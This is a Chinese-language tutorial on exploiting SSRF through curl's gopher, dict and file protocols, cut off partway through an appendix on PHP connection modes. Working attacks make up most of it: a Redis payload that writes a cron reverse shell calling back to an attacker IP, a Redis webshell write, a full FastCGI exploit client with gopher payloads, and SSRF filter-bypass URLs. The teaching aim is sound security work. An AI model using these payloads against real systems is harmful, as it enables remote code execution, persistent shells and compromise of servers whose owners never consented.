下面就详细讲一下curl函数在ssrf中的具体利用方式。 利用方式 一些协议的理解 在讲利用方式之前，我们先来看看curl命令支持哪些网络协议： 12345root@ca01h:/var/www/html/ssrf# curl -Vurl 7.66.0 (x86_64-pc-linux-gnu) libcurl/7.66.0 OpenSSL/1.1.1d zlib/1.2.11 brotli/1.0.7 libidn2/2.2.0 libpsl/0.20.2 (+libidn2/2.0.5) libssh2/1.8.0 nghttp2/1.39.2 librtmp/2.3Release-Date: 2019-09-11Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp Features: AsynchDNS brotli GSS-API HTTP2 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM NTLM_WB PSL SPNEGO SSL TLS-SRP UnixSockets 可以看到该版本的curl支持很多协议，其中gopher协议、dict协议、file协议、http/s协议用的比较多。 gopher Gopher wiki 互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前。（可以模拟GET/POST请求，换行使用%0d%0a，空白行%0a）。 gopher协议的格式： 1gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流 gopher协议在curl命令中的使用方式： 1curl gopher://localhost:2222/hello%0agopher 通过nc回显可以发现，数据换行了， 然而 hello 只回显了 ello ，也就是说 h “被吃了”, 因此要在传输的数据前加一个无用字符： 1curl gopher://localhost:2222/_hello%0agopher 如果是在地址栏利用payload时，需要进行一次url编码： 1http:&#x2F;&#x2F;192.168.91.130&#x2F;ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;localhost:2222&#x2F;_hello%250agopher 再利用ssrf.php： 1234567891011121314151617[root@ca01h ~]# nc -l -vv 2333Ncat: Version 6.40 ( http://nmap.org/ncat )Ncat: Listening on :::2333Ncat: Listening on 0.0.0.0:2333Ncat: Connection from 127.0.0.1.Ncat: Connection from 127.0.0.1:47726 [root@ca01h html]# curl -v &#x27;http://127.0.0.1/ssrf.php?url=gopher://127.0.0.1:2333/_test&#x27; [root@ca01h ~]# nc -l -vv 2333Ncat: Version 6.40 ( http://nmap.org/ncat )Ncat: Listening on :::2333Ncat: Listening on 0.0.0.0:2333Ncat: Connection from 127.0.0.1.Ncat: Connection from 127.0.0.1:47726.test dict 字典服务器协议。dict是基于查询相应的TCP协议。服务器监听端口2628。漏洞代码没有屏蔽回显的情况下，可以利用dict协议获取ssh等服务版本信息。 因为ssrf.php的漏洞代码有回显，所以curl命令直接访问 12curl -v http://localhost/ssrf/ssrf.php?url=dict://127.0.0.1:6379/info 即可看到redis的相关配置。 12curl -v http://localhost/ssrf/ssrf.php?url=dict://127.0.0.1:22/info 即可看到ssh的banner信息。 如果ssrf.php中加上一行屏蔽回显的代码curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);，那么这种方式就失效了，和gopher一样，只能利用nc监听端口，反弹传输数据了。 file 本地文件传输协议，主要用于访问本地计算机中的文件。 因为ssrf.php的漏洞代码有回显，所以浏览器直接访问： http/s 主要用来探测内网服务。根据响应的状态判断内网端口及服务，可以结合java系列0day和其他各种0day使用。 攻击Redis 目标：阿里云服务器 Centos7 IP：47.97.199.89 攻击：华为云服务器 Centos7 IP：121.36.45.17 具体环境搭建请转到文章末尾的Appendix B。 Redis反弹Shell（root权限） 什么是反弹Shell：https://xz.aliyun.com/t/2549 先写一个redis反弹shell的bash脚本如下： 1234567#shell.shecho -e &quot;\\n\\n\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/121.36.45.17/2333 0&gt;&amp;1\\n\\n\\n&quot;|redis-cli -h $1 -p $2 -x set 1redis-cli -h $1 -p $2 config set dir /var/spool/cron/redis-cli -h $1 -p $2 config set dbfilename rootredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit 在redis的第0个数据库中添加key为1，value为\\n\\n\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/121.36.45.17/2333 0&gt;&amp;1\\n\\n\\n\\n的字段。最后会多出一个n是因为echo重定向最后会自带一个换行符。CONFIG SET 命令动态地调整 Redis 服务器的配置，每个用户生成的crontab文件，都会放在 /var/spool/cron/ 目录下面，set直接往当前用户的crontab里写入反弹shell。 想获取Redis攻击的TCP数据包，可以使用socat进行端口转发。 123socat -v tcp-listen:4444,fork tcp-connect:localhost:6379bash shell.sh 127.0.0.1 4444 意思是将本机的4444端口转发到本机的6379端口。访问该服务器的4444端口，访问的其实是该服务器的6379端口。捕获到数据如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&gt; 2019&#x2F;12&#x2F;16 13:50:01.167534 length&#x3D;89 from&#x3D;0 to&#x3D;88*3\\r$3\\rset\\r$1\\r1\\r$62\\r*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;121.36.45.179&#x2F;2333 0&gt;&amp;1\\r&lt; 2019&#x2F;12&#x2F;16 13:50:01.167814 length&#x3D;5 from&#x3D;0 to&#x3D;4+OK\\r&gt; 2019&#x2F;12&#x2F;16 13:50:01.171555 length&#x3D;57 from&#x3D;0 to&#x3D;56*4\\r$6\\rconfig\\r$3\\rset\\r$3\\rdir\\r$16\\r&#x2F;var&#x2F;spool&#x2F;cron&#x2F;\\r&lt; 2019&#x2F;12&#x2F;16 13:50:01.171779 length&#x3D;5 from&#x3D;0 to&#x3D;4+OK\\r&gt; 2019&#x2F;12&#x2F;16 13:50:01.175397 length&#x3D;52 from&#x3D;0 to&#x3D;51*4\\r$6\\rconfig\\r$3\\rset\\r$10\\rdbfilename\\r$4\\rroot\\r&lt; 2019&#x2F;12&#x2F;16 13:50:01.175619 length&#x3D;5 from&#x3D;0 to&#x3D;4+OK\\r&gt; 2019&#x2F;12&#x2F;16 13:50:01.179000 length&#x3D;14 from&#x3D;0 to&#x3D;13*1\\r$4\\rsave\\r&lt; 2019&#x2F;12&#x2F;16 13:50:01.185711 length&#x3D;5 from&#x3D;0 to&#x3D;4+OK\\r&gt; 2019&#x2F;12&#x2F;16 13:50:01.189649 length&#x3D;14 from&#x3D;0 to&#x3D;13*1\\r$4\\rquit\\r&lt; 2019&#x2F;12&#x2F;16 13:50:01.189817 length&#x3D;5 from&#x3D;0 to&#x3D;4+OK\\r 转换规则如下： 如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。 如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。 将\\r字符串替换成%0d%0a 空白行替换为%0a 转换脚本：tran2gopher.py 1234567891011121314151617181920212223242526272829303132333435python tran2gopher.py socat.log#coding: utf-8#author: JoyChouimport sysexp = &#x27;&#x27;with open(sys.argv[1]) as f: for line in f.readlines(): if line[0] in &#x27;&gt;&lt;+&#x27;: if line[1] in &#x27;?&#x27;: exp = exp + line else: continue # 判断倒数第2、3字符串是否为\\r elif line[-3:-1] == r&#x27;\\r&#x27;: # 如果该行只有\\r，将\\r替换成%0a%0d%0a if len(line) == 3: exp = exp + &#x27;%0a%0d%0a&#x27; else: line = line.replace(r&#x27;\\r&#x27;, &#x27;%0d%0a&#x27;) # 去掉最后的换行符 line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;) exp = exp + line # 判断是否是空行，空行替换为%0a elif line == &#x27;\\x0a&#x27;: exp = exp + &#x27;%0a&#x27; else: line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;) exp = exp + lineexp.replace(&quot;$&quot;, &quot;%24&quot;)exp.replace(&quot;&lt;&quot;, &quot;%3C&quot;)exp.replace(&quot;&gt;&quot;, &quot;%3E&quot;)exp.replace(&quot;?&quot;, &quot;%3F&quot;)print exp 结果为： 12*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$62%0d%0a%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;121.36.45.179&#x2F;2333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a 在攻击方执行命令： 123curl -v &#x27;gopher://47.97.199.89:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$62%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/121.36.45.179/2333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&#x27; 出现5个ok，则成功了写入： 12345678910Trying 47.97.199.89:6379...* TCP_NODELAY set* Connected to 47.97.199.89 (47.97.199.89) port 6379 (#0)+OK+OK+OK+OK+OK* Closing connection 0 那再检测以下Redis写入的字段和crontab的内容。 检测Redis数据库的字段为&quot;\\n\\n\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\\n\\n\\n\\n&quot; 检测crontab的内容也没有问题。 最后在目标机上监听端口2333： 12nc -lvvp 2333 稍等一下，就可以成功反弹shell。 获取 web 服务的 webshell 当 redis 权限不高时，并且服务器开着 web 服务，在 redis 有 web 目录写权限时，可以尝试往 web 路径写 webshell。 模仿上面的shell脚本来写： 12345678# shell2.phpredis-cli -h $1 -p $2 flushallredis-cli -h $1 -p $2 config set dir /var/www/redis-cli -h $1 -p $2 config set dbfilename shell.phpredis-cli -h $1 -p $2 set webshell &quot;&lt;?php phpinfo();?&gt;&quot;redis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit 注意：一定要在$POST前面加上转义符\\，不然在最后的文件里面$_POST会被吞掉！！！（因为$符号是redis的一种语法） 执行shell2.php，同样使用socat在4444端口转发。 捕获到的数据如下： 1234567891011121314151617181920212223242526272829303132333435*1\\r$8\\rflushall\\r*4\\r$6\\rconfig\\r$3\\rset\\r$3\\rdir\\r$8\\r&#x2F;var&#x2F;www\\r*4\\r$6\\rconfig\\r$3\\rset\\r$10\\rdbfilename\\r$9\\rshell.php\\r*3\\r$3\\rset\\r$3\\rweb\\r$18\\r%3C%3Fphp%20phpinfo()%3B%3F%3E\\r*1\\r$4\\rsave\\r*1\\r$4\\rquit\\r 参考joychou写cron的脚本转换，python转换脚本如下: 12345678f &#x3D; open(&#39;payload.txt&#39;, &#39;r&#39;)s &#x3D; &#39;&#39;for line in f.readlines(): line &#x3D; line.replace(r&quot;\\r&quot;, &quot;%0d%0a&quot;) line &#x3D; line.replace(&quot;\\n&quot;, &#39;&#39;) s &#x3D; s + lineprint s.replace(&quot;$&quot;, &quot;%24&quot;) 如上的写shell数据流经过编码如下(注意php一句话，经过上面转换还是尖括号，但是使用curl发送的时候要把一句话的两个尖括号和;和?url编码，然后使用curl直接发送如下，我也不知道为啥$还要编码，知道的同学请告知，谢谢）: 123[root@ca0y1h-centos ~]# python tran2gopher.py socat2.logcurl -v &quot;gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%248%0d%0a/var/www%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%249%0d%0ashell.php%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%243%0d%0aweb%0d%0a%2418%0d%0a%3C%3Fphp phpinfo()%3B%3F%3E%0d%0a*1%0d%0a%244%0d%0asave%0d%0aquit%0d%0a&quot; 然后上面的payload在存在ssrf的时候，使用发送之前要再url编码一次，发送即可得到shell。 攻击fastcgi（TCP模式） 环境搭建请转到文章莫问的Appendix B。 什么是fastcgi 请转到文章末尾的Appendix A。 fastcgi默认监听端口为本机的9000端口，如果对外开放的话就有可能造成任意代码执行（具体看p牛文章介绍，讲的非常详细了）。但是一般情况不会对外开放的，所以此时需要配合gopher+ssrf加以利用。 123456条件: libcurl版本&gt;&#x3D;7.45.0 (exp中存在%00，curl版本小于7.45.0，gopher的%00会被截断) PHP-FPM监听端口 PHP-FPM版本 &gt;&#x3D; 5.3.3 知道服务器上任意一个php文件的绝对路径 远程攻击php-fpm 这个场景是有些管理员为了方便吧,把fastcgi监听端口设置为: listen = 0.0.0.0:9000而不是listen = 127.0.0.1:9000 这样子可以导致远程代码执行。 这里利用p牛的exploit脚本: fpm.py python命令： 12python fpm.py -c &#x27;&lt;?php echo `id`;exit;?&gt;&#x27; 192.168.188.130 /var/www/html/index.php SSRF攻击本地的php-fpm 基本原理 PHP-FPM开放在公网上的情况是很少的，大部分时候都是启动在本地即监听127.0.0.1:9000地址的。 虽然我们没有办法直接对PHP-FPM发起攻击，但是我们可以结合其他漏洞来间接利用。如果目标站点存在SSRF漏洞，那么我们就可以借助SSRF来攻击本地PHP-FPM服务，达到任意代码执行的效果。 利用方式 之前已经提到Gopher协议在SSRF利用中被广泛运用，其URL格式如下： 12gopher:&#x2F;&#x2F;&lt;host&gt;:&lt;port&gt;&#x2F;&lt;gopher-path&gt;_后接TCP数据流 也就是说，通过Gopher协议，我们可以直接发送TCP协议流，再进行urlencode编码来构造SSRF攻击代码，其中攻击代码就是恶意FastCGI协议报文。 这里有三种方式来生成恶意FastCGI协议报文： 一种是不用修改P牛的脚本，在本即上直接将流量打到某一个端口（比如9999），同时监听此端口，再保存到本地后进行url编码（此时要求本机上也有php-fpm服务）。 123456789# 本机监听[root@ca01h ~] nc -lvvp 9999 &gt; exp.txtNcat: Version 7.50 ( https://nmap.org/ncat )Ncat: Listening on :::9999Ncat: Listening on 0.0.0.0:9999# 本机执行[root@ca01h ~] python fpm.py 127.0.0.1 /usr/share/nginx/html/index.php -c &quot;&lt;?php echo `whoami`; exit();?&gt;&quot; -p 9999 这样exp.txt中就我们所需要的恶意FastCGI协议报文，再用下面的小脚本对其urlencode得到最终的Payload： 12345from urllib import quotewith open(&#x27;exp.txt&#x27;) as f: pld = f.read()print quote(pld) nginx解码一次,php-fpm解码一次。 第二种是修改P牛的脚本，让其直接返回请求的报文并将其urlencode一次： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259# -*- coding: utf-8 -*-import socketimport randomimport argparseimport sysfrom six.moves.urllib import parse as urlparsefrom io import BytesIO# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i])def bord(c): if isinstance(c, int): return c else: return ord(c)def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode(&#x27;utf-8&#x27;, &#x27;strict&#x27;)def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, &#x27;utf-8&#x27;, &#x27;strict&#x27;) else: s = str(s) return sclass FastCGIClient: &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot; # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\ + bchr(requestid &amp; 0xFF) \\ + bchr((length &gt;&gt; 8) &amp; 0xFF) \\ + bchr(length &amp; 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b&#x27;&#x27; if nLen &lt; 128: record += bchr(nLen) else: record += bchr((nLen &gt;&gt; 24) | 0x80) \\ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record += bchr(vLen) else: record += bchr((vLen &gt;&gt; 24) | 0x80) \\ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header[&#x27;version&#x27;] = bord(stream[0]) header[&#x27;type&#x27;] = bord(stream[1]) header[&#x27;requestId&#x27;] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header[&#x27;contentLength&#x27;] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header[&#x27;paddingLength&#x27;] = bord(stream[6]) header[&#x27;reserved&#x27;] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record[&#x27;content&#x27;] = b&#x27;&#x27; if &#x27;contentLength&#x27; in record.keys(): contentLength = int(record[&#x27;contentLength&#x27;]) record[&#x27;content&#x27;] += buffer.read(contentLength) if &#x27;paddingLength&#x27; in record.keys(): skiped = buffer.read(int(record[&#x27;paddingLength&#x27;])) return record def request(self, nameValuePairs=&#123;&#125;, post=&#x27;&#x27;): if not self.__connect(): print(&#x27;connect failure! please check your fasctcgi-server !!&#x27;) return requestId = random.randint(1, (1 &lt;&lt; 16) - 1) self.requests[requestId] = dict() request = b&quot;&quot; beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b&#x27;&#x27; if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#x27;&#x27;, requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#x27;&#x27;, requestId) #self.sock.send(request) #self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND #self.requests[requestId][&#x27;response&#x27;] = b&#x27;&#x27; #return self.__waitForResponse(requestId) return request def __waitForResponse(self, requestId): data = b&#x27;&#x27; while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR: if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests[&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response[&#x27;requestId&#x27;]): self.requests[requestId][&#x27;response&#x27;] += response[&#x27;content&#x27;] if response[&#x27;type&#x27;] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId][&#x27;response&#x27;] def __repr__(self): return &quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;.format(self.host, self.port)if __name__ == &#x27;__main__&#x27;: parser = argparse.ArgumentParser(description=&#x27;Php-fpm code execution vulnerability client.&#x27;) parser.add_argument(&#x27;host&#x27;, help=&#x27;Target host, such as 127.0.0.1&#x27;) parser.add_argument(&#x27;file&#x27;, help=&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;) parser.add_argument(&#x27;-c&#x27;, &#x27;--code&#x27;, help=&#x27;What php code your want to execute&#x27;, default=&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;) parser.add_argument(&#x27;-p&#x27;, &#x27;--port&#x27;, help=&#x27;FastCGI port&#x27;, default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = &quot;/&quot; uri = args.file content = args.code params = &#123; &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27;: &#x27;POST&#x27;, &#x27;SCRIPT_FILENAME&#x27;: documentRoot + uri.lstrip(&#x27;/&#x27;), &#x27;SCRIPT_NAME&#x27;: uri, &#x27;QUERY_STRING&#x27;: &#x27;&#x27;, &#x27;REQUEST_URI&#x27;: uri, &#x27;DOCUMENT_ROOT&#x27;: documentRoot, &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;, &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27;: &#x27;9985&#x27;, &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;, &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;, &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;, &#x27;CONTENT_TYPE&#x27;: &#x27;application/text&#x27;, &#x27;CONTENT_LENGTH&#x27;: &quot;%d&quot; % len(content), &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;, &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27; &#125; #这里调用request,然后返回tcp数据流,所以修改这里url编码一下就好了 #response = client.request(params, content) #print(force_text(response)) request_ssrf = urlparse.quote(client.request(params, content)) print(force_text(&quot;gopher://127.0.0.1:&quot; + str(args.port) + &quot;/_&quot; + request_ssrf)) 在利用时，还要对其urlencode一次，可以直接使用Burp的Convert Selection功能： ok，成功实现了代码执行。 第三种就是使用gopherus工具，同样非常好用： 1234567891011121314151617181920212223Desktop gopherus --exploit fastcgi ________ .__ &#x2F; _____&#x2F; ____ ______ | |__ ___________ __ __ ______&#x2F; \\ ___ &#x2F; _ \\\\____ \\| | \\_&#x2F; __ \\_ __ \\ | \\&#x2F; ___&#x2F;\\ \\_\\ ( &lt;_&gt; ) |_&gt; &gt; Y \\ ___&#x2F;| | \\&#x2F; | &#x2F;\\___ \\ \\______ &#x2F;\\____&#x2F;| __&#x2F;|___| &#x2F;\\___ &gt;__| |____&#x2F;&#x2F;____ &gt; \\&#x2F; |__| \\&#x2F; \\&#x2F; \\&#x2F; author: $_SpyD3r_$Give one file name which should be surely present in the server (prefer .php file)if you don&#39;t know press ENTER we have default one: &#x2F;var&#x2F;www&#x2F;html&#x2F;index.phpTerminal command to run: whoamiYour gopher link is ready to do SSRF: gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0D%01DOCUMENT_ROOT&#x2F;%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27whoami%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00-----------Made-by-SpyD3r----------- payload在利用时需要再次进行url编码。 绕过方式 https://www.freebuf.com/articles/web/135342.html 总的来说有以下几种方式： IP地址进制转换 例如192.168.0.1这个IP地址我们可以改写成： (1)、8进制格式：0300.0250.0.1 (2)、16进制格式：0xC0.0xA8.0.1 (3)、10进制整数格式：3232235521 (4)、16进制整数格式：0xC0A80001 利用解析URL所出现的问题 在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。 1http:&#x2F;&#x2F;www.baidu.com@192.168.0.1&#x2F; 当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是\\www.baidu.com，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为www.baidu.com，而实际上这个URL所请求的内容都是192.168.0.1上的内容。 filter_var() bypass 看到很多大佬的文章都有提到，找到原文链接 示例代码 12345678910111213141516171819&lt;?php $url &#x3D; $_GET[&#39;url&#39;]; echo &quot;Argument: &quot;.$url.&quot;\\n&quot;; if(filter_var($url, FILTER_VALIDATE_URL)) &#123; $r &#x3D; parse_url($url); var_dump($r); if(preg_match(&#39;&#x2F;google\\.com$&#x2F;&#39;, $r[&#39;host&#39;])) &#123; exec(&#39;curl -v -s &quot;&#39;.$r[&#39;host&#39;].&#39;&quot;&#39;, $a); &#125; else &#123; echo &quot;Error: Host not allowed&quot;; &#125; &#125; else &#123; echo &quot;Error: Invalid URL&quot;; &#125;?&gt;mixed filter_var ( mixed $variable [, int $filter &#x3D; FILTER_DEFAULT [, mixed $options ]] )函数有两种参数。FILTER_VALIDATE_EMAIL 检查是否为有效邮箱FILTER_VALIDATE_URL 检查是否为有效url 代码的逻辑是先判断，url是否符合逻辑，符合则用preg_match来匹配，匹配成功就curl 绕过方式 123http:&#x2F;&#x2F;localhost&#x2F;web&#x2F;test&#x2F;22.php?url&#x3D;0:&#x2F;&#x2F;evil.com:80,google.com:80&#x2F;或http:&#x2F;&#x2F;localhost&#x2F;web&#x2F;test&#x2F;22.php?url&#x3D;0:&#x2F;&#x2F;evil.com:23333;google.com:80&#x2F; 利用，或者；可以绕过。 利用302跳转 如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用302跳转的方式来进行绕过。 (1)、在网络上存在一个很神奇的服务，http://xip.io 当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。 (2)、由于上述方法中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，我们可以通过短地址的方式来绕过。经过测试发现新浪，百度的短地址服务并不支持IP模式，所以这里使用的是http://tinyurl.com所提供的短地址服务。（现在这个网站已经关闭了） Appendix A PHP的连接方式 所谓的连接方式指的就是服务器中间件与某个语言后端进行数据交换的方式。在这里具体而言就是PHP语言和Apache或者Nginx进行数据传输的方式。一共有三种apache2-module、CGI、FastCGI： apache2-module模式 把 php 当做 apache 的一个模块，实际上 php 就相当于 apache 中的一个 dll 或一个 so 文件，phpstudy 的非 nts 模式就是默认以 module 方式连接的。 CGI模式 此时 php 是一个独立的进程比如 php-cgi.exe，web 服务器也是一个独立的进程比如 apache.exe，然后当 Web 服务器监听到 HTTP 请求时，会去调用 php-cgi 进程，他们之间通过 cgi 协议，服务器把请求内容转换成 php-cgi 能读懂的协议数据传递给 cgi 进程，cgi 进程拿到内容就会去解析对应 php 文件，得到的返回结果在返回给 web 服务器，最后 web 服务器返回到客户端，但随着网络技术的发展，CGI 方式的缺点也越来越突出。每次客户端请求都需要建立和销毁进程。因为 HTTP 要生成一个动态页面，系统就必须启动一个新的进程以运行 CGI 程序，不断地 fork 是一项很消耗时间和资源的工作。 FastCGI模式 fastcgi 本身还是一个协议，在 cgi 协议上进行了一些优化。众所周知，CGI 进程的反复加载是 CGI 性能低下的主要原因，如果 CGI 解释器保持在内存中 并接受FastCGI 进程管理器调度，则可以提供良好的性能、伸缩性、Fail-Over 特性等等。 简而言之，CGI 模式是 apache2 接收到请求去调用 CGI 程序，而 fastcgi 模式是 fastcgi 进程自己管理自己的 cgi 进程，而不再是 apache 去主动调用 php-cgi，而 fastcgi 